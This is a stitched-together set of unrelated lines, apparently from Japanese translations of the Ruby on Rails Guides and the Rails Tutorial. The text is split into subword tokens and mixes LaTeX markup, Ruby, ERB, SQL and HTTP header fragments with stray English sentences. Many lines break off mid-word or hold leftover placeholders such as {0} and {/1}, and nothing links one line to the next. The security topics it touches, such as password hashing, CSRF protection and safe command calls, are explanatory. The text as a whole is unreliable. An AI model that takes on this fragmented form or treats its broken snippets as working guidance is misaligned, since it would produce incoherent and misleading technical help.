▁issue を作成する ということは ほとんどの場合 、 自分 にとって は 問題 修正 の ス ター ト ラ イン に 着 く こと であり 、 他の 開発者 にとって は 「 こちら でも 同じ 問題 が 起 き て ます 」 と 確 認 および コメント を追加する 場所 が できた ということ に過ぎません 。
▁* ▁`: nullify ` を指定すると 、 外部キー が ` NULL ` に設定されます 。
▁if ▁@ article ▖ update ( article _ params )
▁* ▁ 与えられた オプションを 同等の SQL クエリ に変換 します 。
▁ ログアウト 用 リンク では 、 リスト \ ref { code : sessions _ resource } で定義した ログアウト 用 パス を使用します 。
▁ 著者 は このように 分割 保存 する のが 論 理 的 である と 考え ますが 、\ k ode { shared } フォルダ に すべて 保存 しても 問題 なく 動作します 。
▁これにより 、` sanitize `、` sanitize _ css `、` strip _ tags ` 、 および ` strip _ links ` メソッドは 新しい 実装 に基いて 動作する ようになります 。
▁# ▁@ business や @ user インスタンス変数 にアクセス できる
▁belongs _ to ▁: customer , ▁ inverse _ of : ▁: orders
▁* ▁` config ▖ action _ dispatch ▖ t ld _ length ` は 、 アプリケーション で使用する トップレベル ドメイン ( T L D ) ▁ の長さ を指定します 。
▁これで 、 仮 に データベース の内容 が 盗 まれ たり 覗 き 見 される ようなことがあ って も 、 パスワード の 安全 性 が 保 た れ ます 。
▁NOTE : ▁これらの カラム名 は 必 須 ではありません が 、 Active ▁Record に 予 約 されています 。
▁data : ▁ { ▁confirm : ▁' A re ▁you ▁sure ? '
▁Date : ▁Sun , ▁24 ▁Jan ▁2010 ▁ 12 : 15 : 53 ▁GMT
▁### ▁Rails の DOM のテスト
▁ INSERT ▁ IN T O ▁clients ▁( created _ at , ▁first _ name , ▁ locked , ▁orders _ count , ▁updated _ at ) ▁ V A L U E S ▁( ' 20 11-0 8 - 30 ▁ 05 : 22 : 57 ', ▁' Andy ', ▁1, ▁NULL , ▁' 20 11-0 8 - 30 ▁ 05 : 22 : 57 ')
▁\ chapter { ユーザーを フォローする }╼\ label { cha : following _ users }╼╼
▁ / users /1/ followers
▁# ▁=> ▁ 123 - 555-1234
▁ただし 、 以下の 3 つの 注意 点 があります 。
▁def ▁set _ author
▁self を省略した 結果を リスト \ ref { code : micropost _ ordering } に示します 。
▁### ▁CDN
▁詳細については [ ミドルウェア を設定する ](# ミドルウェア を設定する ) の 節 を参照してください 。
▁create ▁app / views / users / index ▖ json ▖ jbuilder
▁ たとえ GitHub の issue に このような 「 欲 しい 機能 リスト 」 を コード も 添 え ずに 書き 込 んだ ところで 、 Issue を チェック した 人 によって 早 晩 「 無効 」 と マ ー キ ング されて 終 わ る でしょう 。
▁Action ▁Mailer の コールバック
▁ エンジン は gem として インストール される ので 、 このように する必要があります 。
▁ 他 に どんな コールバック がある のか 知りたい 場合は 、\ href { http :// api ▖ rubyonrails ▖ org / v 4 ▖ 2▖2 / classes / ActiveRecord / Callbacks ▖ html } { Rails ▁API の コールバック } ▁( 英語 ) ▁ を読んでみてください 。
▁2▖ kilobyte s ▁# ▁=> ▁20 48
▁ユーザー登録 の 基本的な テスト 。
▁< h 1> Name s ▁of ▁all ▁the ▁people </ h 1>
▁def ▁perform (* args )
▁ 幸 い 、 解決策 の実装 は 簡単です ▟ 実は 、 この問題 は データベース レベルで も 一意性 を強制する だけで 解決 し { 0 / ます 。
▁Active ▁Record モデルの 作成 は非常に 簡単です 。
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁00:00:00 ▁UTC ▁+00:00 ▖ ▖
▁` + ` に応答する 要素 のみ が 加 算 の 対象 として 前提と されます 。
▁デフォルトは ` false ` であり 、 この場合は Active ▁Record が使用されます 。
▁C : \ Site s > ▁ echo ▁" hello , ▁world "
▁ Ryan ▁Bates 自身 も 、 現 実に は テスト駆動開発 を採用し ていること が 多く あります し 、 彼 の テスティング スタイル は 本書 の もの と 基本的に 同じです ▟)
▁Rails では 、 すべての public な メソッドが ユーザーに 公開 されて 使用される という ことを 前 提 に していません ▟ 代りに 、 その メソッドが 内部 API であること を 示す ために `: no doc : ` ディレクティブ を使用します 。
▁以下の テストは 、 この時点では 失敗する はずです 。
▁# ▁ 更新 に成功した場合 を扱う 。
▁ 以前 は イン ク リ メ ン タ ル な 整 数 が追加され ましたが 、 複数の 開発者 による チーム では 、 複数の プログラマ が 同じ 整 数 を持つ マイグレーション を生成し てしまい 、 コンフリクト を 引 き 起こ していました 。
▁def ▁check _ credit _ limit ( order )
▁これ を表現する には 否 定 の 演算子 が必要 なので 、\ k ode { !} ▁( " bang " ▁ と 読み ます ) ▁ を使用します 。
▁もちろん 、 今 の 時点 では テストは 失敗します 。
▁{0} � 図 3 ▖ 6 ▁{/0}{1} タイトル が 付 いた Home ページ {/1}
▁ 配列 などの 比 較 的 単純な オブジェクトを 複 製 するには 、\ k ode { dup } メソッド を使用する ことができます 。
▁この 設定 は ` config ▖ cache _ classes ` が false の 場合に 影 響 を受け ます ▟ ` config ▖ cache _ classes ` は development モードでは ` config ▖ cache _ classes ` はデフォルトで オフ です 。
▁\ k ode { ul } タグ の \ k ode { nav } と \ k ode { pull - right } クラスは 、 Bootstrap において 特別な 意味 を持ちます 。
▁ これはリスト \ ref { code : minimum _ password _ length _ test } で使用されていました 。
▁class _ name : ▁" Order ",
▁# ▁Find ▁the ▁clients ▁with ▁primary ▁keys ▁1 ▁and ▁10 ▖
▁class _ name ▁= ▁name ▖ to _ s ▖ camelize
▁` app / views / articles / _ form ▖ html ▖ erb ` という名前の パーシャル ファイルを作成し 、 以下 の内容を 入力 してください 。
▁# ▁ label (: article , ▁: title )
▁\ href { http :// guides ▖ rubyonrails ▖ org / active _ record _ query ing ▖ html } { where } や like の詳細については 、 Rails ▁G u ide の 「\ k ode { Active ▁Record ▁ Query ▁Interface { } / } ▁( 英語 )」 を参照してください 。
▁* ▁` collection _ singular _ id s `
▁* ▁FROM ▁` users ` ▁ INNER ▁JOIN ▁` articles ` ▁ ON ▁` articles ` ▖ ` user _ id ` ▁= ▁` users ` ▖ ` id ` ▁WHERE ▁` users ` ▖ ` id ` ▁= ▁1
▁def ▁index
▁#### # ▁CDN と Cache - Control ヘッダ
▁ 対応策 は 、 ▁ _ コマンドライン の パラメータを 安全 に 渡 せる ` system ( コマンド , ▁ パラメータ ) ` メソッドを使用することで す ▟ _
▁ イニシャライザ ファイル を使用する
▁そこで は 、 digest メソッドを \ k ode { user ▖ rb } に 置く ことを す す め ています 。
▁render で 呼び出し ている ビュー が 同じ である 理由は 、 この ERb は どちらの 場合 でも ほぼ 同じ であり 、 リスト \ ref { code : show _ follow _ view } で 両方 の場合 をカバー できる ためです 。
▁Rails ▁ は データベース と 連 携 して 動的な Web サイト を 開発 する ように 設計 されています が 、 HTML ファイル だけで 構成 されている 静的なページ を 作る こともできます 。
▁self を省略した 結果を リスト \ ref { code : user _ update _ action _ unsuccessful } に示します 。
▁これは 名前空間 化 の 最も 肝 心 な 部分 であり 、 これ については 本ガイド の [ ルーティング ](# ルーティング ) セクション で 後 述 します 。
▁たとえば 、 仮 に ` app / assets / javascripts / projects ▖ js ▖ erb ▖ coffee ` という ファイル を呼び出す と 、 最初に CoffeeScript イン タ プ リ タ によって 処理 されます ▟ しかし これは 次の ERB で 処理 できない ので 問題 が発生する ことがあります 。
▁Article ▖ where ( trashed : ▁true )▖ where ( trashed : ▁false )
▁最後に ホ ーム 画面 を実装 した ときは ▁( 図 \ ref { fig : sample _ app _ logo }) 、[ Sign ▁up ▁now ! ] ▁ ボタン が 中 央 に あり ました 。
▁最後に 、 いくつかの ルール を サイト ロゴ に追加します ▟ この サイト ロゴ は 「 sample ▁app 」 だけ が表示されている シンプルな ものです 。
▁< p >
▁これで 、 本番環境 の サーバー で サンプルアプリケーション が 動作 している はずです 。
▁#### # ▁CDN リクエスト キャッシュ
▁### ▁ すべての スコープ を削除する
▁A c ce p t - Range s :
▁`: separator ` オプションで 正規表現 を使用することもできます 。
▁これ については 、 リスト \ ref { code : microposts _ home _ page } で 実装します 。
▁< script ▁src ="/ assets / application - 9 08 e 25 f 4 b f 64 1 868 d 868 3022 a 5 b 6 2 f 5 4 ▖ js "></ script >
▁╼╼ ▁\ subsection { 前 提 知識 } ▁% ▁( fold )╼ ▁\ label { sec : prerequisites }╼╼ The re ▁are ▁no ▁form al ▁ prerequisites ▁to ▁this ▁book , ▁and ▁the ▁\ emph {
▁resources ▁: d ra f t s
▁たとえば 、 攻撃者が 仮 に データベース にアクセス でき てしまう と 、 攻撃者が 作成した 新しい アカウント を 即座に 有効 にする ことが できてしまいます ▟ 攻撃者は その アカウント で ゆ う ゆ う と ログイン し 、 パスワード を変更 して その アカウント の 権限 を 手 に 入 れる ことでしょう 。
▁しかし 実装 の 出 発 点 としては これで 十分です ▟ なお 、 最終的な 実装 は \ ref { sec : strong _ parameters } で 完了 します 。
▁Users リソース の 最後の 仕 上 げ として 、\ k ode { destroy } アクション へのリンク を追加しましょう 。
▁ 彼 ら に 会 う ことが あった ら 、 ぜ ひ お 礼 を 述 べ て や ってください 。
▁ これはリスト \ ref { code : authenticated _ p } で使用されていました 。
▁resources ▁: comments , ▁ shallow : ▁true
▁B ▖ x ▁= ▁: b
▁* ▁` action _ controller ▖ logger `: ▁` Rails ▖ logger ` に対する 設定 が行われていない 場合に ` ActionController :: Base ▖ logger ` を設定します 。
▁{0} Figure ▁2▖ 17 : ▁{/0}{1} The ▁inheritance ▁hierarchy ▁for ▁the ▁Users ▁and ▁Microposts ▁controllers ▖ {/1}
▁` P er m it S crubber ` および ` T ar get S crubber ` の ドキュメント には 、 どの 要素を どの タイミング で 除 去 すべき か を 完全に 制御 する方法 が 記載 されています 。
▁\ k ode {" user [ email ] "} という 名前 は 、\ k ode { user } ハッシュの \ k ode { email } 属性を 正確に 指 します 。
▁さらに ありがたい ことに 、 base 64 は URL を 安全 に エスケープ するために も 用 い られる ▁(\ k ode { url safe _ base 64 } という名前の メソッド がある こと から も わかります ) ▁ ので 、 base 64 を 採 用 すれば 、 {1} 第 {2} 10 {/2} 章 {/1} で アカウントの有効化 のリンク や パスワード リ セット のリンク でも 同じ トークン ジェネレータ を使用 できるようになります 。
▁ エンジン を ひとつ 作成する と 、 や が て エンジンの 部品 と アプリケーションの 部品 を 連 携 させるため に 、 アプリケーションの 特定の クラスを エンジン から 利用 した くなる でしょう 。
▁この プロジェクト 名 は 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / P OS I X } { P OS I X } の \ href { http :// en ▖ w ikipedia ▖ org / wiki / For k _ ( s of t w a re _ development )} { for k } における Spork の 用 法 を も じ った ものです 。
▁ この章 の サンプルアプリケーション では 、 Active ▁Record のメリット はまだ は っ き り とは わからない かもしれませんが 、 この後 の 章では ファクトリー の 機能を さらに 活用 する 予定です 。
▁ これはリスト \ ref { code : signed _ in _ p } で使用されていました 。
▁scope ▁: active , ▁-> ▁ { ▁ unscope ( where : ▁: state )▖ where ( state : ▁' active ') ▁ }
▁ユーザー 削除 用 リンク の実装 ▁( 管理者 に のみ 表示される )
▁ 無効な フォームの 送信 を 扱えるように な った ので 、 いよいよ 新規ユーザー を 実際に データベースに保存 できるように し ▁( もちろん フォーム が 有効な 場合に ) 、 ユーザー登録フォーム を完成させ ましょう 。
▁\ label { fig : custom _ help _ page } }╼\ end { figure } ╼╼% ▁subsection ▁custom _ static _ pages ▁( end )╼╼ ▁% ▁section ▁static _ pages ▁( end )╼╼ ╼ ▁\ section { テスト から 始 め る } ▁% ▁( fold )╼ ▁\ label { sec : getting _ started _ with _ testing }╼╼
▁ 本書 における 主要な テストは 、\ emph { コントローラ テスト } ▁( この節 より ) 、\ emph { モデル テスト } ▁( {1} 第 {2} 6 {/2} 章 {/1} より ) 、\ emph { 統合テスト } ▁( {3} 第 {2} 7 {/2} 章 {/3} より ) ▁ の 3 つ です 。
▁JavaScript レスポンス を 伴 う GET リクエスト も ク ロスサイトリクエストフォージェリ ▁( CSRF ) ▁ 保 護 の 対象 となり ました 。
▁\ ref { sec : activating _ the _ account } ▖ の 表 \ ref { table : password _ token _ digest } ▁ を元に 、 より 一 般 性 の高い \ k ode { authenticated ?} メソッド を定義する ことにします 。
▁図 \ ref { fig : user _ has _ many _ followers } を参考に した データモデル の実装 を リスト \ ref { code : has _ many _ following _ through _ active _ relationships } に示します が 、 この 実装 は リスト \ ref { code : has _ many _ following _ through _ passive _ relationships } と まさに 類似 しています 。
▁d =' ex - ce 3 9 07 ' ></ span >╼ \ end { enumerate }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / hola _ mundo ▖ png }╼\ end { center }╼\ caption { Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` ¡ H ol a , ▁ mundo !'' ▖ \ label { fig : hola _ mundo } }╼\ end { figure }╼╼\ begin { figure }╼\ begin { center }╼\ image { images / figures / goodbye _ world ▖ png }╼\ end { center }╼\ caption { Chang ing ▁the ▁root ▁route ▁to ▁return ▁`` goodbye , ▁world !'' ▖ \ label { fig : goodbye _ world } }╼\ end { figure } ╼╼% ▁subsection ▁ hello _ world ▁( end )╼╼ ▁% ▁section ▁up _ and _ running ▁( end )╼╼ ▁\ section { Git による バージョン管理 } ▁% ▁( fold )╼ ▁\ label { sec : version _ control }╼╼
▁\ text tt { POST } ▁ は 、 GET の 次に よく 使用される 操作 で 、 ページ 上の フォーム に 入力 した 値を 、 ブラウザから 送信する 時に 送 られる リクエスト です 。
▁({0}{1} 第 8 章 {/1}{/0} で 本 格 的に 実装します ) 。
▁* ▁` helper ` は ヘルパー を生成する かどうかを指定します 。
▁ 通常 、 これらの アクションは 、 ページを 出力 せずに データベース上の ユーザー情報 を 操作 します ▁( もちろん 、 ページを 出力 しても 良い のですが ) 。
▁d ▖ end _ of _ week (: sunday ) ▁# ▁=> ▁S at , ▁ 08 ▁May ▁2010
▁上のコード を使用 せずに あえて リスト \ ref { code : proto _ status _ feed } の コードを 利用 した のは 、 {2}{1} 第 12 章 {/1}{/2} で 必要となる 完全な ステータスフィード で 応用 が 効 く ためです 。
▁# ▁ Custom ▁Rails ▁Tutorial ▁ spec s
▁follow / unfollow フォームの パーシャル
▁ 前 者 の 問題 を \ ref { sec : signup _ error _ messages } で 、 後者の 問題 を \ ref { sec : successful _ signup s } で それぞれ 解決 していきます 。
▁ 他 も同様です 。
▁ バリデーション は 、 正しい データ だけ をデータベースに保存する ために 行われます 。
▁ ユーザーに サービス 利用 条 項 への 同 意 、 何らかの 文 書 に 目 を 通 す こと など を 義 務 付ける の に使用する のが 典型的な 利用 法 です 。
▁validates ▁: surname , ▁presence : ▁true , ▁if : ▁" name ▖ nil ? "
▁\ href { https :// www ▖ code school ▖ com /}{ Code ▁School } : ▁ 非常に 多 種 多 様 な プログラミング を対話的に 学習 できる コース
▁xml ▖ guid (@ person ▖ fi rm ▖ account ▖ url ▁+ ▁@ recent _ items ▖ url ( item ) )
▁config ▖ assets ▖ debug ▁= ▁true
▁この コードを書く ためには 、 論理値 を返す \ k ode { logged \_ in ?} メソッドが 必要な ので 、 まず それ を定義します 。
▁Users リソース のように ▁( Users モデル を経由して ) ▁ データベース を バックエンド に 持つ リソース とは異なり 、 この Sessions リソース では \ href { http :// en ▖ w ikipedia ▖ org / wiki / HTTP _ cookie }{\ emph { cookies } } を使用します ▟ cookies とは 、 ブラウザ に保存 される 小さな テキスト データ です 。
▁* ▁development 環境で 圧縮 機能 や 最小化 機能 がすべて 利用 できるように しておくこと 。
▁ 仕 上 げ に 、 ナビゲーション バー にある ユーザー 設定 へのリンク を更新し ます 。
▁Ruby は 通常の 場合 、 他の オブジェクト を含む オブジェクトを ` dup ` しても 、 他の オブジェクト については 複 製 しません ▟ このような コピー は 「 浅 い コピー ▁( shallow ▁copy )」 と呼ばれ ます 。
▁ テストが パス するためには 、 リスト \ ref { code : home _ page _ base _ title } のように Home ページのビュー から \ k ode { provide } ▁ の 行 を削除する 必要があります 。
▁このガイドでは 、 Active ▁Record の関連付け 機能 ( ア ソ シ エ ー ション ) について解説します 。
▁### ▁` has _ many ▁: through ` と ` has _ and _ belongs _ to _ many ` のどちら を 選 ぶ か
▁Relationship 用の fixture を 空 にする
▁\ no indent ▁\ emph { Learn ▁En ough ▁Command ▁L in e ▁to ▁Be ▁D angerous } ▁is ▁an ▁introduction ▁to ▁the ▁command ▁line ▁for ▁complete ▁beginners , ▁the ▁first ▁in ▁a ▁\ href { http :// learn en ough ▖ com /}{ s er ies ▁of ▁tutorial s } ▁design ed ▁to ▁teach ▁the ▁common ▁foundation s ▁of ▁`` computer ▁magic '' ▁( Bo x ~\ ref { aside : computer _ magic }) ▁to ▁as ▁br o ad ▁an ▁a udi ence ▁as ▁possible ▖
▁X ▁= ▁: in _ Object
▁` app / views / articles / edit ▖ html ▖ erb ` という ファイルを作成し 、 以下のコード を 入力 してください 。
▁このメソッドは 、 浮 動 小 数 点 記 法 の BigDecimal 値 を簡単に 表示 するための 便利な 方法 を提供します 。
▁ umerate }╼╼ ▁% ▁subsection ▁the _ model _ file ▁( end )╼╼ ▁\ subsection { ユーザー オブジェクト を作成する } ▁% ▁( fold )╼ ▁\ label { sec : creating _ user _ objects }╼╼
▁次に 、\ k ode { : media } 引数 は ハッシュの よう ですが 、 波 かっこ がない 点が 不思議 です 。
▁ つ い 使って み た くなる が 実際には 役に立 た ない \ k ode { current _ user } の定義
▁ 更新 された \ k ode { Gemfile } では 、 J Query に関する 以下の行 も 変更します ▟ J Query は Rails のデフォルトの JavaScript ライブラリ です 。
▁ 技術 的に は 、 インデント が 一番 浅 い 行 を探し て 、 その インデント 分 だけ 行 頭 の ホワイトスペース を 全体 から 削除 する という 操作を 行 っています 。
▁class ▁Section ▁< ▁ActiveRecord :: Base
▁なお 、 この \ k ode { Proc file } は ルート ディレクトリ ▁(\ k ode { Gemfile } と同じ ディレクトリ ) ▁ に置い ておく 必要がある ので 、 ファイルの 置き場所 には 注意してください 。
▁resources ▁: photos , ▁as : ▁' admin _ photos '
▁C A UT ION : ▁` validates _ associated ` は 関連付けの 両 側 の オブジェクト では 実行 しないでください 。
▁これは 以下 で使用する 最初の アプリケーション です 。
▁now ▖ all _ year
▁> > ▁@ user ▁ ||= ▁" the ▁user "
▁#### ▁` parent `
▁本ガイドでは 、 Rails の エンジン について解説します ▟ また 、 簡潔 で 使い やすい インターフェイス を使った 、 ホスト アプリケーション 向 け 追加 機能 についても 解説します 。
▁i ▖ increment !( : views )
▁def ▁a _ method _ used _ for _ validation _ p urpose s
▁$ ▁ echo ▁$ DAT A BASE _ URL
▁ まだ 始 ま った ばかり ですが 、 今のうちに Rails アプリケーションの 全体 的な 仕 組み を 知 っ ておく ことは 後 々 役 立 ち ます ▁( 図 \ ref { fig : MVC }) 。
▁ アプリケーション の拡張 に 取り か か る 前に 、 まずは 現状の 変更を マージ しておきましょう 。
▁Contact ページの テストを リスト \ ref { code : contact _ page _ test } に示します ▟ これは 単 に リスト \ ref { code : pages _ controller _ spec _ title } で使用されている テストの パターン に 従 った ものです 。
▁このオプション は ` production ` 環境 で使用する と デプロイ 時に 思 わ ぬ 動作を する 可能性があります ので 、 development 環境 ( ` config / environments / development ▖ rb ` ) で使用する ことをお勧めします 。
▁ 著者 の 経験 を元に 、 以下のように まとめて み ました 。
▁# ▁Use ▁ ActiveModel ▁has _ secure _ password
▁ 「 forgot ▁password 」 リンク のある ログイン ページ
▁# ▁you ' ve ▁ limited ▁to ▁: test , ▁: development , ▁or ▁: production ▖
▁\ ref { sec : layouts _ and _ embedded _ ruby } で学んだ ように 、\ k ode { yield } メソッドは Web サイトの レイアウト に ページ ご と の内容 を挿入 します 。
▁ 1234567890▖50 ▖ to _ s (: currency ) ▁# ▁=> ▁$ 1, 2 34 , 5 67 , 89 0▖5 0
▁ フォローしているユーザー と フォロワー の両方 を表示する \ k ode { show \_ follow } ビュー
▁ すべての コア 拡張機能 を 単 に 読み 込 んで お き たい のであれば 、 以下のように require します 。
▁\ k ode { gravatar _ for } ヘルパーメソッド を定義する
▁ユーザー を破棄する と マイクロポスト も 破棄され ること をテストする 。
▁### ▁` squish `
▁JavaScript が 無効 になって い たとき のための 設定
▁これ を解決する 方法は 、 フォローしているユーザー の id の 検索 をデータベースに保存する ときに \ emph { サブ セレクト ▁( subselect ) ▁ } を使用すること です 。
▁この ヘルパー を使用して 、 Atom フィード を簡単に 生成 できます 。
▁validates ▁: g a me s _ play ed , ▁ numericality : ▁ { ▁only _ integer : ▁true ▁ }
▁{" foo " ▁=> ▁1, ▁" bar " ▁=> ▁2}▖ to _ xml
▁ 新規 作成した Rails ▁4 アプリケーションに はデフォルトで ` app / assets / javascripts / application ▖ js ` ファイルに 以下のような 記 述 が含まれています 。
▁ マイクロポストの 順序 付け をテストする
▁ここでは 、 最初の ユーザーに ユーザー 3 から ユーザー 51 まで を フォロー させ 、 それ から 逆に ユーザー 4 から ユーザー 4 1 に 最初の ユーザーを フォロー させ ます ▟ ソース を見ると わかるように 、 このような 設定 を 自由に 行う ことができます 。
▁リスト \ ref { code : image _ upload _ test } で 追加 した テストでは 、 マイクロポストの 投 稿 フォーム や picture 属性を い じ って 、 無効な 送信 や 有効な 送信 を チェック しています 。
▁リスト \ ref { code : application _ layout _ redux } の 以下の行 にご注目ください 。
▁`: source ` オプションは 、` has _ one ▁: through ` 関連付け における 「 ソース の 」 関連付け 名 、 つまり 関連付け 元の 名前 を指定します 。
▁上の 流れ を もう少し 詳 しく 見 て み る ことにします 。
▁# ▁You ▁can ▁use ▁` rake ▁secret ` ▁to ▁generate ▁a ▁secure ▁secret ▁key ▖
▁ 現時点では 、 以下の 有効な 送信 テストは 失敗する はずです 。
▁I ▁shall ▁be ▁late !" ▖ truncate _ words ( 4 , ▁ separator : ▁ / \ s / )
▁この エラーが発生し た のは 、 ルーティング で 指定された 先に 、 リクエストを 処理 する ように 定義された コントローラ が 見つからない ためです 。
▁ サインアップ ページ へのリンク がある Home ページ
▁**` ActionDispatch :: ShowExceptions ` **
▁</ body >
▁find _ by ( re g ion _ id : ▁order _ number [ 0 ▖ ▖ 2 ])
▁ キー は 属性 名 、 値は すべての エラー 文字列 の配列 です 。
▁def ▁cache s _ action (* action s )
▁ { title : ▁" RSS ▁F e ed " }) ▁%>
▁ただし 、 このテストは これまで よりも 高度な 内容 になる ため 、 いくつか に 分割 して 説明します ▟ RSpec が 初めて の 方は 、 この節 を 繰り返し 読んで み てください 。
▁Rails では 、 こうした 最小化 と 連結 を使用することで 、 あらゆる JavaScript を 実行 できます 。
▁ CarrierWave を導入する と 、 Rails の ジェネレータ ー で 画像 アップ ロー ダ ー が 生成 できるようになります ▟ 早速 、 次の コマンドを実行 してみましょう ▁( 画像 の ことを image と すると 一般的 過 ぎ るので 、 今回は \ k ode { picture } と呼ぶ ことにします )
▁ / users /1/ following
▁次の \ ref { sec : activating _ the _ account } で テストを もう少し 追加 し 、 リファクタリング を 少々 施 せ ば 完了 です 。
▁この 関連付け に対応する ▁` assemblies _ part s ` ▁ テーブル を マイグレーション で 作成し 、 裏 付け ておく 必要があります 。
▁上のコード にある 以下の行 にご注目ください 。
▁以下の例 で 簡単に 説明します 。
▁ ハッシュ 関数 には 最新の \ href { http :// en ▖ w ikipedia ▖ org / wiki / B crypt } { bcrypt } を使用し 、 パスワードを 不可 逆 的に 暗号化 して パスワード ハッシュ を作成します 。
▁2 つ目の アプリ のために 別の ワークスペース を作成する 必要はありません 。
▁上のコード から 以下の HTML が生成されます 。
▁この 保存 場所 は 、 デフォルトでは ` / assets ` ディレクトリ です 。
▁0▖0 ▖ clone ▁# ▁=> ▁all o cat or ▁undefined ▁for ▁F lo at
▁ ファイルの 削除
▁\ emph { Rails チュートリアル } における ディレクトリ の 区切り は 、 コマンドライン の プロンプト と同様に Unix スタイル の スラッシュ 「\ k ode { / }」 を使っています 。
▁` config / database ▖ yml ` ファイル を使用することで 、 データベース接続 に必要な すべての 情報 を指定できます 。
▁この クエリ を 模 式 的に 書く と 以下の ようになります 。
▁最初に 、 User オブジェクトが \ k ode { authenticate } に応答する こと を要求します 。
▁この \ k ode { session } オブジェクトは 、 ユーザー id を cookies に 保 持 することで 、 ページ 移動 後に も ユーザー id を参照 できるように しています ▟ cookies は ブラウザ が 閉 じ られる と 無効 になります 。
▁ 再び 以下を実行し ます 。
▁* ▁` mail ` ▁- ▁ 実際の メール 自身 を送信し ます 。
▁ 親 リソース で `: shallow ` オプション を指定すると 、 すべての ネストした リソース が 浅 く なります 。
▁ 早速 、\ k ode { link _ to } メソッドの 2 番目の 引数 で 、 適切な 名前付きルート を使って みましょう 。
▁| ▁| ▁50 8 ▁| ▁: lo o p _ de t ec ted ▁|
▁ 拡張 を 多くの 関連付け で 共有 したい場合は 、 名前付き の拡張 モジュール を使用することもできます 。
▁User モデル に対して \ k ode { has _ secure _ password } を追加する 利 点 は \ ref { sec : creating _ a _ user } で 少しだけ 説明します が 、 ▁ その前に 、 パスワード の 最 小文字 数 を設定する 方法 について説明します 。
▁ プルリクエスト は 、 ひとつ の コミット に まとめ ておく ことが 望 まれ ます 。
▁これ より 、 アプリケーションで ` User ` を表す クラスを エンジン から カスタマイズ 可能 に する方法 について説明します 。
▁$ ▁ rm ▁README ▖ rdoc
▁ アセットパイプライン について
▁\ k ode { user ▖ followed _ users } 属性 のテスト 。
▁Bundler では 本番環境 用の gem は インストール しない 設定 に して お いた ので ▁(\ ref { sec : sample _ app _ setup }) 、 リスト \ ref { code : unicorn _ gemfile } は 開発環境 に 影 響 はありません ▟ しかし 、 Bundler に \ k ode { Gemfile ▖ lock } を更新し てもらう 必要がある ので 、 いつものように 次の コマンドを実行 しておきます 。
▁------------ -------- ----------------
▁ 12345 67 ▖ to _ s (: human _ size ) ▁# ▁=> ▁1▖ 18 ▁M B
▁#### ▁` last `
▁# ▁app / job s / guest s _ cleanup ▖ rb
▁**` ActionDispatch :: Static ` **
▁ テスト 中の ログイン ステータス を 論理値 で 返す メソッド
▁#### ▁ auto _ discover y _ link _ tag
▁このコードは 次の コード を確かめるため のテスト なので 、
▁get ▁' books /* section / : title ', ▁to : ▁' books # show '
▁* ▁` config ▖ action _ dispatch ▖ perform _ deep _ munge ` は 、 パラメータ に対して ` deep _ munge ` メソッドを 実行 すべき かどうかを指定します 。
▁ レシーバ ー の キー を直接 シンボル に変換 する 破壊的な ` symbolize _ keys !` もあります 。
▁NOTE : ▁ 定義ファイル の場所は ` active _ support / core _ ext / module / attribute _ accessor s ▖ rb ` です 。
▁`: status ` オプションを使用することで 、 レスポンス の ステータスコード を変更 できます 。
▁<%= ▁render ▁partial : ▁" product ", ▁collection : ▁@ products ,
▁profile ▖ name
▁Active ▁Support では 、` Time ▖ current ` を定義し て 現在の タイムゾーン における 「 今 日 」 を 定 め ています 。
▁\ k ode { include ?} のような メソッド を学ぶ ことが 、
▁ これはリスト \ ref { code : current _ user _ equal s } で使用されていました 。
▁ delivery _ method _ options : ▁ delivery _ options )
▁上のルーティングは ` z oo / w oo / foo / bar / baz ` にマッチし 、` params [: a ]` には ` ' z oo / w oo ' ` が保存され 、 and ▁` params [: b ]` には ` ' bar / baz ' ` が 保存されます 。
▁最後に もう一度 申し上げ ます ▟ ほとんどの場合 、 シングルクォート と ダブルクォート のどちら を 使 お う と 大きな 違い はありません ▟ 実際 、 一 般 の ソースコード では 、 明 確 な 理由 も なく 両者 が 混 用 されている ケース を よく 見 かけ ます 。
▁# { severity } ▁> = ▁@ level ▁# ▁D E B U G ▁> = ▁@ level
▁ バリデーション 機能 は 強 力 ですが 、 うまく 動いている 自 信 を持つ のが 難 しい です ▟ しかし 、( テスト駆動開発 のように ) ▁ まず 失敗する テストを 書き 、 次に テストを 成功 させる ように 実装 すると 、 期 待 した 通り に 動いている 自 信 を 持 て る ようになります 。
▁* ▁続いて 、 ビューで ` attachments ` を ハッシュ として 参 照 し 、 表示 したい 添付 ファイル を指定することができます ▟ これを行なうには 、` attachments ` に対して ` url ` を呼び出し 、 その 結果を ` image _ tag ` メソッドに 渡します 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁{0} 図 ▁ 2▖1 ▁{/0}{1} Bitbucket に toy アプリ の リポジトリ を作成する {/1}
▁following
▁- 4 ▖ ex abytes ▁# ▁=> ▁- 4 6 1 16 8 60 18 4 27 3 87 9 04
▁number _ to _ human _ size ( 12345 67 ) ▁# ▁=> ▁1▖ 2 ▁M B
▁4 ▁examples , ▁0 ▁failure s
▁if ▁@ business ▁&& ▁@ business ▖ has _ smtp _ settings ?
▁ 本書 では 、 SQLite を 開発 ▁( development ) ▁ 環境で 使い 、 また PostgreSQL を ▁( Heroku での ) ▁ 本番環境で 使い ます ▁(\ ref { sec : deploying })▟ Rails は 、 本番 ▁( production ) ▁ アプリケーションで すら 、 データ の 保存 方法 の詳細 について ほとんど 考え る 必要 がない くらい よく でき ています 。
▁user ▁= ▁User ▖ new
▁この マイグレーション を実行すると 、` articles ` という テーブル が作成され 、 文字列 カラム と テキスト カラム が 1 つ ずつ 作成されます 。
▁< input ▁id =" person _ first _ name " ▁name =" person [ first _ name ] " ▁type =" text " ▁/>
▁page ▖ attachments ▖ create ( {
▁t ▖ belongs _ to ▁: ph y s ic i an
▁#### # ▁` monday `、` sunday `
▁このとき 2 つの ケース を チェック します ▟ 1 つ は 、 ログイン していない ユーザー であれば 、 ログイン 画面 にリダイレクトされる ことです ▟ もう 1 つ は 、 ログイン 済み では あって も 管理者 で なければ 、 ホ ーム 画面 にリダイレクトされる ことです 。
▁* ▁` config ▖ active _ record ▖ table _ name _ suffix ` は テーブル名 の 後ろに グローバル に追加し たい 文字列 を指定します 。
